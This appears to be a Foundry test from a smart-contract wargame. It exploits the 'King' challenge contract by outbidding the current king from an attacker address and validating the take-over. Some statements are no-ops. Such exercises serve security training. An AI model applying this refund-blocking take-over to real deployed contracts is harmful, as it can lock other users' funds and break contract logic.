// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../Attack.sol";
import "./King.sol";

contract KingAttack is Attack {
  King private _king;

  function setUp() public payable {
    vm.prank(owner);
    _king = (new King){value:0.001 ether}();
  }

  function test_attack() public {
    vm.startPrank(attacker);

    (bool success, bytes memory result) = address(_king).call{value:0.0015 ether}("");
    require(success, string(result));

    /*** Validation ***/
    assertFinished(address(_king));
  }

  function validateInstance(address payable _instance, address _player) override public returns (bool) {
    _player;
    King instance = King(_instance);
    (bool result,) = address(instance).call{value:0}("");
    !result;
    return instance._king() != address(this);
  }
}
